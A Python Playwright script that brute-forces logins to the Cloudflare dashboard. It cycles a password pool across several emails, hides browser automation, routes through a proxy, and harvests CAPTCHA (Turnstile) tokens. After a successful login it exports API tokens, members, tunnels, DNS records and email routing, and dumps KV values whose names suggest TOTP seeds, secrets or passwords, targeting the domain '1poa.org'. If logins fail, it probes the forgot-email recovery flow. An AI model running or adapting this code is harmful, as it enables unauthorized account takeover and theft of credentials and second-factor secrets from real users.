#!/usr/bin/env python3
# Multi-email bounded CF dash login (<=1 POST per email/password) + full read-only export.
# If all fail: trigger dash forgot-password for readable 163 mailbox via real UI, log API calls.
import os, sys, json, time, re
from urllib.parse import quote

BASE = os.path.dirname(os.path.abspath(__file__))
TAG = os.environ.get('EGRESS_TAG', 'hk')
OUT = os.path.abspath(os.path.join(BASE, '..', 'out', TAG))
os.makedirs(OUT, exist_ok=True)

def log(*a):
    s = ' '.join(str(x) for x in a)
    print('[MX] ' + s, flush=True)
    try:
        with open(os.path.join(OUT, 'probe.log'), 'a') as f:
            f.write(s + '\n')
    except Exception:
        pass

def dump(name, obj):
    try:
        with open(os.path.join(OUT, name), 'w') as f:
            f.write(obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False, indent=1))
        log('SAVED', name)
    except Exception as e:
        log('SAVEERR', name, e)

EMAILS = [e.strip() for e in os.environ.get('CF_DASH_EMAILS', '').split(',') if e.strip()]
PW_SECRET = os.environ.get('CF_DASH_PW', '')
PW_WEAK = os.environ.get('CF_DASH_PW_WEAK', '123456')
PROXY = os.environ.get('LOCAL_PROXY', 'http://127.0.0.1:8899')
KEY = '0x4AAAAAADlYAGQxVeGSor-h'
T0 = time.time()
def el():
    return '%.0fs' % (time.time() - T0)

def pick_exec():
    for p in ('/usr/bin/google-chrome-stable', '/usr/bin/google-chrome', '/opt/google/chrome/chrome'):
        if os.path.exists(p):
            return p
    return None

def api(page, path, method='GET', body=None):
    try:
        return page.evaluate("""async ([u,m,b])=>{
            try{
              const opt={method:m, credentials:'include', headers:{accept:'application/json'}};
              if(b!==null){opt.headers['content-type']='application/json';opt.body=JSON.stringify(b);}
              const r=await fetch(u,opt); let t=await r.text();
              let sc=[]; try{r.headers.forEach((v,k)=>{if(/set-cookie/i.test(k))sc.push(v);});}catch(e){}
              return {status:r.status, body:t, setcookie:sc};
            }catch(e){return {status:0, body:'ERR '+e.message+' '+String(e)};}
        }""", [path, method, body])
    except Exception as e:
        return {'status': -1, 'body': 'EVAL ' + str(e)}

def read_inputs(page):
    try:
        return page.evaluate("""()=>{const o={};document.querySelectorAll('input').forEach(i=>{o[i.name||('#'+(i.id||''))]=(i.value||'').slice(0,4096);});return o;}""")
    except Exception as e:
        return {'_err': str(e)}

def is_tok_field(k):
    kl = k.lower()
    if 'security_token' in kl:
        return False
    if 'cf_challenge' in kl or 'challenge_response' in kl:
        return True
    if 'turnstile' in kl and ('response' in kl or 'token' in kl):
        return True
    if 'cf-turnstile' in kl or 'captcha' in kl:
        return True
    return False

def get_token(page, wait_s=90):
    """poll hidden inputs, then explicit invisible render. returns (tok, src, sec)"""
    tok = None; src = None; sec = ''
    for s in range(max(1, wait_s // 2)):
        inp = read_inputs(page)
        sec = inp.get('security_token', sec) or sec
        for k, v in inp.items():
            if v and len(v) > 12 and is_tok_field(k):
                tok = v; src = 'native:' + k; break
        if tok:
            break
        if s % 8 == 0:
            log('WAITNATIVE', el(), json.dumps({k: len(v) for k, v in inp.items() if re.search(r'token|challenge|turnstile', k, re.I)})[:300])
        page.wait_for_timeout(2000)
    if tok:
        return tok, src, sec
    try:
        ready = page.evaluate("()=>!!(window.turnstile && window.turnstile.render)")
        log('TS_API', ready)
        if ready:
            page.evaluate("""(key)=>{
              window.__ts={tok:null,err:null,st:[]};
              let d=document.getElementById('ts_self');
              if(!d){d=document.createElement('div');d.id='ts_self';
                d.style.cssText='position:fixed;left:10px;bottom:10px;z-index:2147483647';document.body.appendChild(d);}
              window.turnstile.render('#ts_self',{sitekey:key,theme:'light',size:'flexible',appearance:'interaction-only',
                callback:(t)=>{window.__ts.tok=t;window.__ts.st.push('OK:'+t.length);},
                'error-callback':(e)=>{window.__ts.err=String(e);window.__ts.st.push('ERR:'+String(e));},
                'timeout-callback':()=>window.__ts.st.push('TIMEOUT')});
            }""", KEY)
            for s in range(25):
                st = page.evaluate("()=>window.__ts?{tok:window.__ts.tok?window.__ts.tok.length:0,err:window.__ts.err,st:window.__ts.st.slice(-2)}:null")
                if s == 6:
                    try: page.evaluate("()=>{try{window.turnstile.execute('#ts_self');}catch(e){}}")
                    except Exception: pass
                if st and st.get('tok', 0) > 12:
                    return page.evaluate("()=>window.__ts.tok"), 'explicit-invisible', sec
                if s % 5 == 0:
                    log('EXPL_TS', el(), json.dumps(st)[:200])
                page.wait_for_timeout(2000)
    except Exception as e:
        log('EXPLERR', str(e)[:160])
    return None, None, sec

def login_attempt(ctx, email, pwlabel, pw, idx):
    """One login POST max. returns dict result"""
    res = {'idx': idx, 'email': email, 'pwlabel': pwlabel, 'status': None, 'body': None, 'user': None,
           'page_log': []}
    page = ctx.new_page()
    try:
        try:
            page.goto('https://dash.cloudflare.com/login', wait_until='domcontentloaded', timeout=120000)
        except Exception as e:
            log('NAVERR', el(), str(e)[:160])
        form = False
        for i in range(60):  # up to 150s
            try:
                if page.evaluate("()=>!!document.querySelector('#email')"):
                    form = True; break
            except Exception:
                pass
            page.wait_for_timeout(2500)
        log('ATTEMPT', idx, email, pwlabel, 'FORM', form, el())
        res['form'] = form
        if not form:
            res['status'] = 'NO_FORM'
            return res
        inp = read_inputs(page)
        sec = inp.get('security_token', '') or ''
        try:
            page.fill('#email', email)
            page.fill('#password', pw)
        except Exception as e:
            log('FILLERR', str(e)[:120])
        tok, src, sec = get_token(page, 90)
        res['tok_src'] = src; res['tok_len'] = len(tok) if tok else 0
        log('TOKEN', idx, src, res['tok_len'], el())
        if not tok:
            res['status'] = 'NO_TOKEN'
            return res
        r = api(page, '/api/v4/login', 'POST',
                {'email': email, 'password': pw, 'cf_challenge_response': tok, 'security_token': sec})
        body = r.get('body')
        # never persist password
        res['status'] = r.get('status'); res['body'] = body
        log('LOGIN', idx, email, pwlabel, 'status=', r.get('status'),
            'resp=', str(body)[:400].replace('\n', ' '))
        u = api(page, '/api/v4/user')
        res['user'] = u
        log('USER', idx, u.get('status'), str(u.get('body'))[:250].replace('\n', ' '))
        try:
            res['cookies'] = [{'name': c['name'], 'domain': c['domain']} for c in ctx.cookies()]
        except Exception:
            pass
        return res
    finally:
        try:
            page.close()
        except Exception:
            pass

def export_all(page):
    out = {}
    def g(name, path):
        r = api(page, path)
        out[name] = r.get('status')
        dump('X_' + name + '.json', r.get('body') or '')
        log('EP', name, r.get('status'), 'len', len(r.get('body') or ''))
        try:
            return json.loads(r.get('body') or '{}')
        except Exception:
            return {}
    acc = g('accounts', '/api/v4/accounts')
    g('memberships', '/api/v4/memberships')
    g('user', '/api/v4/user')
    g('user_tokens', '/api/v4/user/tokens')
    g('iam_eval', '/api/v4/user/iam/dash-authz-eval-roles')
    # all zones unfiltered (paginate up to 5 pages)
    zones = []
    for pg in range(1, 6):
        z = g('zones_p%d' % pg, '/api/v4/zones?per_page=50&page=%d' % pg)
        rl = z.get('result') or []
        zones.extend(rl)
        if len(rl) < 50:
            break
    dump('ALL_ZONES.json', zones)
    log('ZONECOUNT_ALL', len(zones), [zz.get('name') for zz in zones])

    accs = acc.get('result') or []
    for a in accs:
        aid = a.get('id')
        pre = 'acct_%s' % aid[:8]
        g(pre + '_detail', '/api/v4/accounts/%s' % aid)
        g(pre + '_members', '/api/v4/accounts/%s/members' % aid)
        g(pre + '_tokens', '/api/v4/accounts/%s/tokens' % aid)
        g(pre + '_zones', '/api/v4/accounts/%s/zones?per_page=50' % aid)
        g(pre + '_workers_scripts', '/api/v4/accounts/%s/workers/scripts' % aid)
        g(pre + '_workers_subdomain', '/api/v4/accounts/%s/workers/subdomain' % aid)
        g(pre + '_kv_ns', '/api/v4/accounts/%s/storage/kv/namespaces' % aid)
        g(pre + '_pages', '/api/v4/accounts/%s/pages/projects' % aid)
        g(pre + '_r2', '/api/v4/accounts/%s/r2/buckets' % aid)
        g(pre + '_d1', '/api/v4/accounts/%s/d1/database' % aid)
        g(pre + '_tunnels', '/api/v4/accounts/%s/cfd_tunnel?is_deleted=false' % aid)
        g(pre + '_email_addr', '/api/v4/accounts/%s/email/routing/addresses' % aid)
        g(pre + '_access_apps', '/api/v4/accounts/%s/access/apps' % aid)
        g(pre + '_audit', '/api/v4/accounts/%s/audit_logs?per_page=50' % aid)
        g(pre + '_subscriptions', '/api/v4/accounts/%s/subscriptions' % aid)
        g(pre + '_registrar', '/api/v4/accounts/%s/registrar/domains' % aid)
        # KV keys/values
        try:
            kvs = json.loads(out.get(pre + '_kv_ns') if isinstance(out.get(pre + '_kv_ns'), str) else '{}')
        except Exception:
            kvs = {}
        kvres = None
        try:
            kvres = json.loads(open(os.path.join(OUT, 'X_' + pre + '_kv_ns.json')).read())
        except Exception:
            pass
        nss = (kvres or {}).get('result') or []
        kvout = {}
        for ns in nss:
            nid = ns.get('id')
            k = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/keys?limit=1000' % (aid, nid))
            try:
                keys = json.loads(k.get('body') or '{}').get('result') or []
            except Exception:
                keys = []
            vals = {}
            for kk in keys:
                kn = kk.get('name', '')
                if re.search(r'totp|2fa|otp|seed|secret|token|backup|password|passwd|key|1poa|cloudflare|cf', kn, re.I):
                    vv = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/values/%s' % (aid, nid, kn))
                    vals[kn] = (vv.get('body') or '')[:2000]
            kvout[ns.get('title') or nid] = {'keys': [x.get('name') for x in keys][:800], 'sensitive_values': vals}
        dump('X_' + pre + '_kv_dump.json', kvout)
        # tunnels detail
        try:
            tun = json.loads(open(os.path.join(OUT, 'X_' + pre + '_tunnels.json')).read()).get('result') or []
        except Exception:
            tun = []
        for t in tun:
            tid = t.get('id')
            g(pre + '_tun_%s' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s' % (aid, tid))
            g(pre + '_tun_%s_conn' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s/connections' % (aid, tid))
            g(pre + '_tun_%s_cfg' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s/configurations' % (aid, tid))

    # per-zone detail
    for zz in zones:
        zid = zz.get('id'); zn = zz.get('name', '')
        zp = 'zone_%s' % re.sub(r'[^a-zA-Z0-9]', '_', zn)[:30]
        g(zp + '_detail', '/api/v4/zones/%s' % zid)
        g(zp + '_dns', '/api/v4/zones/%s/dns_records?per_page=200' % zid)
        g(zp + '_settings', '/api/v4/zones/%s/settings' % zid)
        g(zp + '_email_rules', '/api/v4/zones/%s/email/routing/rules' % zid)
        g(zp + '_email_settings', '/api/v4/zones/%s/email/routing' % zid)
        g(zp + '_workers_routes', '/api/v4/zones/%s/workers/routes' % zid)
        g(zp + '_rulesets', '/api/v4/zones/%s/rulesets' % zid)
        g(zp + '_pagerules', '/api/v4/zones/%s/pagerules' % zid)
        g(zp + '_ssl', '/api/v4/zones/%s/ssl/certificate_packs' % zid)
    dump('EXPORT_SUMMARY.json', out)
    return out, zones


def forget_email_flow(ctx, domain):
    """Probe dash /forgot-email: enter domain, capture UI text + API responses."""
    log('FORGET_BEGIN', domain, el())
    page = ctx.new_page()
    seen = []
    def on_resp(r):
        try:
            u = r.url
            if '/api/v4/' in u:
                seen.append({'s': r.status, 'm': r.request.method, 'u': u[:300]})
        except Exception:
            pass
    page.on('response', on_resp)
    res = {'domain': domain}
    try:
        page.goto('https://dash.cloudflare.com/forgot-email', wait_until='domcontentloaded', timeout=120000)
        page.wait_for_timeout(6000)
        log('FORGET_URL', page.url)
        res['url'] = page.url
        inputs = page.evaluate("""()=>[...document.querySelectorAll('input')].map(i=>({name:i.name,id:i.id,type:i.type,ph:i.placeholder}))""")
        log('FORGET_INPUTS', json.dumps(inputs)[:600])
        res['inputs'] = inputs
        dump('forget_page.html', page.content()[:400000])
        txt0 = page.evaluate("()=>document.body?document.body.innerText.slice(0,2500):''")
        res['text_before'] = txt0
        sel = None
        for s in ('input[name=domain]', 'input[id=domain]', '#email', 'input[type=text]', 'input[type=email]'):
            try:
                if page.query_selector(s):
                    sel = s; break
            except Exception:
                pass
        if sel:
            page.fill(sel, domain)
            res['filled'] = sel
            clicked = False
            for bs in ('button[type=submit]', 'button:has-text("Send")', 'button:has-text("Continue")', 'button:has-text("Submit")', 'button:has-text("Next")'):
                try:
                    e2 = page.query_selector(bs)
                    if e2:
                        e2.click(); clicked = True; log('FORGET_CLICK', bs); break
                except Exception:
                    pass
            if not clicked:
                try: page.keyboard.press('Enter')
                except Exception: pass
            page.wait_for_timeout(10000)
            txt = page.evaluate("()=>document.body?document.body.innerText.slice(0,3000):''")
            res['text_after'] = txt
            log('FORGET_TEXTAFTER', (txt or '')[:1200].replace('\n', ' | '))
            dump('forget_after.html', page.content()[:400000])
        res['api_seen'] = seen
        dump('forget_result.json', res)
        log('FORGET_API', json.dumps(seen)[:1200])
    except Exception as e:
        log('FORGET_ERR', str(e)[:200]); res['err'] = str(e)[:300]
    finally:
        try: page.close()
        except Exception: pass
    return res

def export_all(page, zfilter='1poa.org'):
    S = {}
    def g(name, path, keep=600000):
        r = api(page, path)
        b = r.get('body') or ''
        S[name] = r.get('status')
        dump('X_' + name + '.json', b[:keep])
        log('EP', name, r.get('status'), 'len', len(b))
        try: return json.loads(b)
        except Exception: return {}
    user = g('user', '/api/v4/user')
    g('memberships', '/api/v4/memberships')
    accs = (g('accounts', '/api/v4/accounts').get('result') or [])
    zones = []
    for pg in range(1, 6):
        z = g('zones_p%d' % pg, '/api/v4/zones?per_page=50&page=%d' % pg)
        rl = z.get('result') or []
        zones.extend(rl)
        if len(rl) < 50: break
    dump('ALL_ZONES.json', zones)
    log('ZONE_NAMES', json.dumps([z.get('name') for z in zones]))
    for a in accs:
        aid = a.get('id'); pre = 'acct_%s' % aid[:8]
        g(pre + '_detail', '/api/v4/accounts/%s' % aid)
        g(pre + '_members', '/api/v4/accounts/%s/members' % aid)
        g(pre + '_tokens', '/api/v4/accounts/%s/tokens' % aid)
        g(pre + '_cfd_tunnel', '/api/v4/accounts/%s/cfd_tunnel?is_deleted=false' % aid)
        g(pre + '_workers_scripts', '/api/v4/accounts/%s/workers/scripts' % aid)
        g(pre + '_workers_subdomain', '/api/v4/accounts/%s/workers/subdomain' % aid)
        g(pre + '_kv_ns', '/api/v4/accounts/%s/storage/kv/namespaces?per_page=100' % aid)
        g(pre + '_email_addr', '/api/v4/accounts/%s/email/routing/addresses' % aid)
        g(pre + '_registrar', '/api/v4/accounts/%s/registrar/domains?per_page=100' % aid)
        g(pre + '_subscriptions', '/api/v4/accounts/%s/subscriptions' % aid)
        # KV dump (keys + sensitive values)
        try:
            nss = json.loads(open(os.path.join(OUT, 'X_' + pre + '_kv_ns.json')).read()).get('result') or []
        except Exception:
            nss = []
        kvout = {}
        for ns in nss:
            nid = ns.get('id')
            kk = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/keys?limit=1000' % (aid, nid))
            try: keys = json.loads(kk.get('body') or '{}').get('result') or []
            except Exception: keys = []
            vals = {}
            for k in keys:
                kn = k.get('name', '')
                if re.search(r'1poa|totp|2fa|otp|seed|secret|token|backup|pass|key|cloudflare|cf', kn, re.I):
                    vv = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/values/%s' % (aid, nid, quote(kn)))
                    vals[kn] = (vv.get('body') or '')[:2000]
            kvout[ns.get('title') or nid] = {'keys': [x.get('name') for x in keys][:1000], 'sensitive_values': vals}
        dump('X_' + pre + '_kv_dump.json', kvout)
    for zz in zones:
        zid = zz.get('id'); zn = zz.get('name', '')
        zp = 'zone_%s' % re.sub(r'[^a-zA-Z0-9]', '_', zn)[:30]
        g(zp + '_detail', '/api/v4/zones/%s' % zid)
        g(zp + '_dns', '/api/v4/zones/%s/dns_records?per_page=500' % zid)
        g(zp + '_settings', '/api/v4/zones/%s/settings' % zid)
        g(zp + '_email_settings', '/api/v4/zones/%s/email/routing' % zid)
        g(zp + '_email_rules', '/api/v4/zones/%s/email/routing/rules?per_page=200' % zid)
        g(zp + '_workers_routes', '/api/v4/zones/%s/workers/routes' % zid)
        g(zp + '_ssl', '/api/v4/zones/%s/ssl/certificate_packs?per_page=100' % zid)
    dump('EXPORT_SUMMARY.json', S)
    return user, zones


def forget_email_flow2(ctx, domain):
    log('FORGET2_BEGIN', domain, el())
    page = ctx.new_page()
    seen = []
    reqs = []
    def on_resp(r):
        try:
            if '/api/v4/' in r.url:
                seen.append({'s': r.status, 'm': r.request.method, 'u': r.url[:300]})
        except Exception: pass
    def on_req(r):
        try:
            if '/api/v4/' in r.url and r.method == 'POST':
                reqs.append({'u': r.url[:300], 'd': (r.post_data or '')[:400]})
        except Exception: pass
    page.on('response', on_resp); page.on('request', on_req)
    res = {'domain': domain}
    try:
        page.goto('https://dash.cloudflare.com/forgot-email', wait_until='domcontentloaded', timeout=120000)
        page.wait_for_timeout(5000)
        log('FORGET2_URL', page.url)
        btns = page.evaluate("""()=>[...document.querySelectorAll('button,input[type=submit],a')].map(b=>({t:b.tagName,x:(b.innerText||b.value||'').trim().slice(0,40),type:b.type,vis:!!(b.offsetWidth||b.offsetHeight)}))""")
        log('FORGET2_BTNS', json.dumps(btns)[:1200])
        res['buttons'] = btns
        ok = page.evaluate("""(v)=>{const el=document.querySelector('#zone_name')||document.querySelector('input[name=zone_name]')||document.querySelector('input[type=text]'); if(!el) return 'noinput'; const s=Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set; s.call(el,v); el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); return el.id||el.name;}""", domain)
        log('FORGET2_FILL', str(ok))
        res['fill'] = ok
        tok = get_token(page, 90)
        log('FORGET2_TOKEN', len(tok or ''))
        res['token_len'] = len(tok or '')
        clicked = page.evaluate("""()=>{const bs=[...document.querySelectorAll('button,input[type=submit]')]; let b=bs.find(x=>/send|continue|submit|next/i.test((x.innerText||x.value||''))); if(!b) b=bs.find(x=>!!(x.offsetWidth||x.offsetHeight)); if(b){b.click(); return (b.innerText||b.value||b.tagName);} const f=document.querySelector('form'); if(f){if(f.requestSubmit) f.requestSubmit(); else f.submit(); return 'form-submit';} return 'none';}""")
        log('FORGET2_CLICK', str(clicked))
        res['clicked'] = clicked
        page.wait_for_timeout(12000)
        txt = page.evaluate("()=>document.body?document.body.innerText.slice(0,4000):''")
        res['text_after'] = txt
        res['url_after'] = page.url
        log('FORGET2_TEXTAFTER', (txt or '')[:1500].replace('\n',' | '))
        dump('forget2_after.html', page.content()[:600000])
        res['api_seen'] = seen
        res['api_posts'] = reqs
        dump('forget2_result.json', res)
        log('FORGET2_API', json.dumps(seen)[:1500])
        log('FORGET2_POSTS', json.dumps(reqs)[:1000])
    except Exception as e:
        log('FORGET2_ERR', str(e)[:300]); res['err'] = str(e)[:400]
        try: dump('forget2_result.json', res)
        except Exception: pass
    finally:
        try: page.close()
        except Exception: pass
    return res

def main():
    exe = pick_exec()
    if os.environ.get('CF_MODE') == 'forget':
        with __import__('playwright.sync_api', fromlist=['sync_playwright']).sync_playwright() as p:
            prof = '/tmp/cfforget_' + TAG
            kw = dict(headless=False, args=['--no-sandbox','--disable-dev-shm-usage','--disable-gpu','--disable-dbus','--disable-blink-features=AutomationControlled','--window-size=1366,900','--no-first-run','--no-default-browser-check','--disable-features=Translate,MediaRouter','--lang=en-US'], locale='en-US', timezone_id='Asia/Hong_Kong', viewport={'width':1366,'height':900})
            if PROXY: kw['proxy'] = {'server': PROXY, 'bypass':'127.0.0.1,localhost'}
            if exe: kw['executable_path'] = exe
            else: kw['channel'] = 'chrome'
            ctx = p.chromium.launch_persistent_context(prof, **kw)
            try:
                tr = ctx.request.get('https://dash.cloudflare.com/cdn-cgi/trace', timeout=45000)
                log('TRACE', tr.status, (tr.text() or '').replace('\n',' ')[:300])
            except Exception as e: log('TRACEERR', str(e)[:160])
            forget_email_flow2(ctx, '1poa.org')
            try: ctx.close()
            except Exception: pass
        log('END', el())
        return
    pool = []
    try:
        pool = json.loads(os.environ.get('CF_POOL_JSON', '[]'))
    except Exception as e:
        log('POOL_PARSE_ERR', str(e)[:120])
    emails = EMAILS
    log('EGRESS', TAG, 'EXEC', exe, 'EMAILS', emails, 'POOLN', len(pool))
    results = []
    winner = None
    with __import__('playwright.sync_api', fromlist=['sync_playwright']).sync_playwright() as p:
        prof = '/tmp/cfpool_' + TAG
        kw = dict(headless=False,
                  args=['--no-sandbox','--disable-dev-shm-usage','--disable-gpu','--disable-dbus',
                        '--disable-blink-features=AutomationControlled','--window-size=1366,900',
                        '--no-first-run','--no-default-browser-check','--disable-features=Translate,MediaRouter',
                        '--lang=en-US','--disable-breakpad','--disable-crash-reporter'],
                  locale='en-US', timezone_id='Asia/Hong_Kong',
                  viewport={'width':1366,'height':900})
        if PROXY: kw['proxy'] = {'server': PROXY, 'bypass':'127.0.0.1,localhost'}
        if exe: kw['executable_path'] = exe
        else: kw['channel'] = 'chrome'
        ctx = p.chromium.launch_persistent_context(prof, **kw)
        try:
            tr = ctx.request.get('https://dash.cloudflare.com/cdn-cgi/trace', timeout=45000)
            log('TRACE', tr.status, (tr.text() or '').replace('\n',' ')[:300])
        except Exception as e: log('TRACEERR', str(e)[:160])
        idx = 0; stop = False
        max_pairs = int(os.environ.get('CF_MAX_PAIRS','30'))
        # interleave: strongest password across all emails first
        for pwobj in pool:
            if stop or winner: break
            label = pwobj.get('l'); pw = pwobj.get('p')
            if not pw: continue
            for email in emails:
                if idx >= max_pairs: stop = True; break
                idx += 1
                r = login_attempt(ctx, email, label, pw, idx)
                results.append(r)
                dump('attempt_%02d.json' % idx, {k:v for k,v in r.items() if k != 'user'})
                st = r.get('status'); body = str(r.get('body') or ''); u = r.get('user') or {}
                if st == 200 and '"success":true' in body.replace(' ','') and u.get('status') == 200 and '"email"' in str(u.get('body')):
                    winner = {'email': email, 'pwlabel': label}; break
                if st == 200 and re.search(r'two.factor|mfa', body, re.I):
                    if u.get('status') == 200 and '"email"' in str(u.get('body')):
                        winner = {'email': email, 'pwlabel': label}; break
                    results[-1]['mfa_pending'] = True; break
                if st in (429, 503) or re.search(r'rate|too many|locked|try again later', body, re.I):
                    log('RATE_LIMIT_STOP', st, body[:200]); results[-1]['rate_limited'] = True; stop = True; break
        dump('attempts_all.json', results)
        log('WINNER', json.dumps(winner))
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        u = api(page, '/api/v4/user')
        authed = u.get('status') == 200 and '"email"' in str(u.get('body'))
        log('FINAL_USER', u.get('status'), str(u.get('body'))[:200].replace('\n',' '))
        if authed:
            log('AUTHED_EXPORT_BEGIN', el())
            try:
                user, zones = export_all(page)
                names = [z.get('name') for z in zones]
                dump('RESULT.json', {'winner': winner, 'authed': True, 'zones': names, 'user': u.get('body')[:2000]})
                for z in zones:
                    if '1poa' in (z.get('name') or ''):
                        log('FOUND_1POA', json.dumps({k:z.get(k) for k in ('id','name','status','type')}))
                try: dump('cookies.json', ctx.cookies())
                except Exception: pass
            except Exception as e:
                log('EXPORT_ERR', str(e)[:300])
        else:
            log('NO_AUTH', el())
            fr = forget_email_flow(ctx, '1poa.org')
            dump('RESULT.json', {'attempts': [{k:v for k,v in x.items() if k!='user'} for x in results], 'authed': False, 'forget': {k:v for k,v in fr.items() if k!='text_after'}})
        try: ctx.close()
        except Exception: pass
        log('END', el())

if __name__ == '__main__':
    try: main()
    except Exception as e:
        import traceback
        log('FATAL', str(e)[:300]); log('TB', traceback.format_exc()[-1500:])
